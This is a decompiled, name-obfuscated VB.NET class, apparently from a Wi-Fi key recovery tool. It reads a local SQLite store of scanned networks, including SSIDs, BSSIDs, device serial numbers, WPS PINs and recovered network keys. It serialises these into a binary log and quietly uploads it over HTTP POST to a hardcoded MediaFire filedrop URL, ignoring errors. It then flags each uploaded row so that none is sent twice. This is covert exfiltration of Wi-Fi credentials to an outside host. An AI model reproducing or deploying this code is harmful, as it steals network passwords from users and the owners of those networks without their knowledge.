Imports System
Imports System.Collections.Generic
Imports System.Data.SQLite
Imports System.IO
Imports System.Net
Imports System.Runtime.CompilerServices
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices

' Token: 0x0200000E RID: 14
Public Class GClass1
	' Token: 0x06000163 RID: 355 RVA: 0x00006CD8 File Offset: 0x00004ED8
	Public Function method_0() As Object
		Dim result As Object
		Try
			Dim list As List(Of GClass1.GClass2) = Me.method_2()
			If list.Count > 0 Then
				Dim stream As Stream = Me.method_1(list)
				Me.method_4(String.Format("{0}_{1}.log", Class13.string_3, DateAndTime.Now.ToString("yy-MM-dd_HH-mm-ss")), CType(stream, MemoryStream))
				Try
					For Each gclass As GClass1.GClass2 In list
						Me.method_3(gclass)
					Next
				Finally
					Dim enumerator As List(Of GClass1.GClass2).Enumerator
					CType(enumerator, IDisposable).Dispose()
				End Try
			End If
			result = True
		Catch ex As Exception
			result = False
		End Try
		Return result
	End Function

	' Token: 0x06000164 RID: 356 RVA: 0x00006DA0 File Offset: 0x00004FA0
	Private Function method_1(ByRef list_0 As List(Of GClass1.GClass2)) As Stream
		Dim result As Stream
		Try
			Dim stream As Stream = New MemoryStream()
			Dim binaryWriter As BinaryWriter = New BinaryWriter(stream)
			binaryWriter.Write("WairCutApLog".ToCharArray())
			binaryWriter.Write(1)
			binaryWriter.Write(Class13.string_3.Length)
			binaryWriter.Write(Class13.string_3.ToCharArray())
			binaryWriter.Write(Class13.string_2.Length)
			binaryWriter.Write(Class13.string_2.ToCharArray())
			binaryWriter.Write(DateAndTime.Now.ToString("yyyy/MM/dd HH:mm:ss").ToCharArray())
			binaryWriter.Write(list_0.Count)
			Try
				For Each gclass As GClass1.GClass2 In list_0
					binaryWriter.Write(gclass.string_0.Length)
					binaryWriter.Write(gclass.string_0.ToCharArray())
					binaryWriter.Write(gclass.string_1.Length)
					binaryWriter.Write(gclass.string_1.ToCharArray())
					binaryWriter.Write(gclass.string_2.Length)
					binaryWriter.Write(gclass.string_2.ToCharArray())
					binaryWriter.Write(gclass.string_3.Length)
					binaryWriter.Write(gclass.string_3.ToCharArray())
					binaryWriter.Write(gclass.string_4.Length)
					binaryWriter.Write(gclass.string_4.ToCharArray())
					binaryWriter.Write(gclass.string_5.Length)
					binaryWriter.Write(gclass.string_5.ToCharArray())
					binaryWriter.Write(gclass.string_6.Length)
					binaryWriter.Write(gclass.string_6.ToCharArray())
					binaryWriter.Write(gclass.string_7.Length)
					binaryWriter.Write(gclass.string_7.ToCharArray())
					binaryWriter.Write(gclass.string_8.Length)
					binaryWriter.Write(gclass.string_8.ToCharArray())
					binaryWriter.Write(gclass.string_9.Length)
					binaryWriter.Write(gclass.string_9.ToCharArray())
					binaryWriter.Write(gclass.string_10.Length)
					binaryWriter.Write(gclass.string_10.ToCharArray())
					binaryWriter.Write(gclass.string_11.Length)
					binaryWriter.Write(gclass.string_11.ToCharArray())
					binaryWriter.Write(gclass.string_12.Length)
					binaryWriter.Write(gclass.string_12.ToCharArray())
					binaryWriter.Write(gclass.string_13.Length)
					binaryWriter.Write(gclass.string_13.ToCharArray())
					binaryWriter.Write(gclass.string_14.Length)
					binaryWriter.Write(gclass.string_14.ToCharArray())
					binaryWriter.Write(gclass.int_0)
					binaryWriter.Write(gclass.int_1)
				Next
			Finally
				Dim enumerator As List(Of GClass1.GClass2).Enumerator
				CType(enumerator, IDisposable).Dispose()
			End Try
			binaryWriter.Close()
			result = stream
		Catch ex As Exception
			result = Nothing
		End Try
		Return result
	End Function

	' Token: 0x06000165 RID: 357 RVA: 0x000070F8 File Offset: 0x000052F8
	Private Function method_2() As List(Of GClass1.GClass2)
		Dim sqliteConnection As SQLiteConnection = New SQLiteConnection("Data Source=Bd\ApLog.db;Version=3;")
		Dim sqliteCommand As SQLiteCommand = New SQLiteCommand("Select * From Networks where Know = 0 and Status = 1", sqliteConnection)
		Dim list As List(Of GClass1.GClass2) = New List(Of GClass1.GClass2)()
		Try
			sqliteConnection.Open()
			Dim sqliteDataReader As SQLiteDataReader = sqliteCommand.ExecuteReader()
			While sqliteDataReader.Read()
				Dim gclass As GClass1.GClass2 = New GClass1.GClass2()
				gclass.string_0 = sqliteDataReader("BSSID").ToString()
				gclass.string_1 = sqliteDataReader("SSID").ToString()
				gclass.string_2 = sqliteDataReader("DeviceName").ToString()
				gclass.string_3 = sqliteDataReader("Manufacturer").ToString()
				gclass.string_4 = sqliteDataReader("ModelName").ToString()
				gclass.string_5 = sqliteDataReader("ModelNumber").ToString()
				gclass.string_6 = sqliteDataReader("SerialNumber").ToString()
				gclass.string_7 = sqliteDataReader("RFBand").ToString()
				gclass.string_8 = sqliteDataReader("UUID").ToString()
				gclass.string_9 = sqliteDataReader("Version").ToString()
				gclass.string_10 = sqliteDataReader("Encryption").ToString()
				gclass.string_11 = sqliteDataReader("ConfigMethods").ToString()
				gclass.int_0 = Conversions.ToInteger(sqliteDataReader("Status"))
				If Not Information.IsDBNull(RuntimeHelpers.GetObjectValue(sqliteDataReader("Pin"))) AndAlso Operators.CompareString(sqliteDataReader("Pin").ToString(), "", False) <> 0 Then
					gclass.string_13 = sqliteDataReader("Pin").ToString()
				End If
				If Not Information.IsDBNull(RuntimeHelpers.GetObjectValue(sqliteDataReader("Key"))) AndAlso Operators.CompareString(sqliteDataReader("Key").ToString(), "", False) <> 0 Then
					gclass.string_12 = sqliteDataReader("Key").ToString()
				End If
				gclass.int_1 = Conversions.ToInteger(sqliteDataReader("DecryptMode"))
				list.Add(gclass)
			End While
			sqliteDataReader.Close()
			sqliteCommand.Dispose()
			sqliteConnection.Close()
		Catch ex As Exception
		End Try
		Return list
	End Function

	' Token: 0x06000166 RID: 358 RVA: 0x00007368 File Offset: 0x00005568
	Public Sub method_3(ByRef gclass2_0 As GClass1.GClass2)
		Dim sqliteConnection As SQLiteConnection = New SQLiteConnection("Data Source=Bd\ApLog.db;Version=3;")
		Dim sqliteCommand As SQLiteCommand = New SQLiteCommand("Update Networks set Know=@Know where BSSID=@BSSID and SSID=@SSID", sqliteConnection)
		Try
			sqliteConnection.Open()
			sqliteCommand.Parameters.AddWithValue("@BSSID", gclass2_0.string_0)
			sqliteCommand.Parameters.AddWithValue("@SSID", gclass2_0.string_1)
			sqliteCommand.Parameters.AddWithValue("@Know", 1)
			sqliteCommand.ExecuteNonQuery()
			sqliteCommand.Dispose()
			sqliteConnection.Close()
		Catch ex As Exception
		End Try
	End Sub

	' Token: 0x06000167 RID: 359 RVA: 0x0000740C File Offset: 0x0000560C
	Private Function method_4(string_0 As String, memoryStream_0 As MemoryStream) As Boolean
		Dim num As Integer = memoryStream_0.ToArray().Length
		Dim httpWebRequest As HttpWebRequest = CType(WebRequest.Create("http://www.mediafire.com/api/1.4/upload/simple.php?filedrop_key=492214d7de748aafa049a2428a99157bbcd9afebb0c4189a0ec24c5c1d502c88"), HttpWebRequest)
		Try
			httpWebRequest.Method = "POST"
			httpWebRequest.KeepAlive = True
			httpWebRequest.Headers.Add("action_on_duplicate", "keep")
			httpWebRequest.Headers.Add("response_format", "json")
			httpWebRequest.Headers.Add("x-filename", string_0)
			httpWebRequest.Headers.Add("x-filesize", num.ToString())
			httpWebRequest.ContentType = "application/octet-stream"
			httpWebRequest.ContentLength = CLng(num)
			httpWebRequest.KeepAlive = False
			Dim stream As Stream = httpWebRequest.GetRequestStream()
			stream.Write(memoryStream_0.ToArray(), 0, num)
			stream.Close()
			Dim httpWebResponse As HttpWebResponse = CType(httpWebRequest.GetResponse(), HttpWebResponse)
			Console.WriteLine(httpWebResponse.StatusDescription)
			stream = httpWebResponse.GetResponseStream()
			Dim streamReader As StreamReader = New StreamReader(stream)
			streamReader.ReadToEnd()
			streamReader.Close()
			stream.Close()
			httpWebResponse.Close()
		Catch ex As Exception
		End Try
		Return True
	End Function

	' Token: 0x0200000F RID: 15
	Public Class GClass2
		' Token: 0x06000168 RID: 360 RVA: 0x00007528 File Offset: 0x00005728
		Public Sub New()
			Me.string_0 = ""
			Me.string_1 = ""
			Me.string_2 = ""
			Me.string_3 = ""
			Me.string_4 = ""
			Me.string_5 = ""
			Me.string_6 = ""
			Me.string_7 = ""
			Me.string_8 = ""
			Me.string_9 = ""
			Me.string_10 = ""
			Me.string_11 = ""
			Me.string_12 = ""
			Me.string_13 = ""
			Me.string_14 = ""
			Me.int_0 = 0
			Me.int_1 = 0
		End Sub

		' Token: 0x0400005D RID: 93
		Public string_0 As String

		' Token: 0x0400005E RID: 94
		Public string_1 As String

		' Token: 0x0400005F RID: 95
		Public string_2 As String

		' Token: 0x04000060 RID: 96
		Public string_3 As String

		' Token: 0x04000061 RID: 97
		Public string_4 As String

		' Token: 0x04000062 RID: 98
		Public string_5 As String

		' Token: 0x04000063 RID: 99
		Public string_6 As String

		' Token: 0x04000064 RID: 100
		Public string_7 As String

		' Token: 0x04000065 RID: 101
		Public string_8 As String

		' Token: 0x04000066 RID: 102
		Public string_9 As String

		' Token: 0x04000067 RID: 103
		Public string_10 As String

		' Token: 0x04000068 RID: 104
		Public string_11 As String

		' Token: 0x04000069 RID: 105
		Public string_12 As String

		' Token: 0x0400006A RID: 106
		Public string_13 As String

		' Token: 0x0400006B RID: 107
		Public string_14 As String

		' Token: 0x0400006C RID: 108
		Public int_0 As Integer

		' Token: 0x0400006D RID: 109
		Public int_1 As Integer
	End Class
End Class
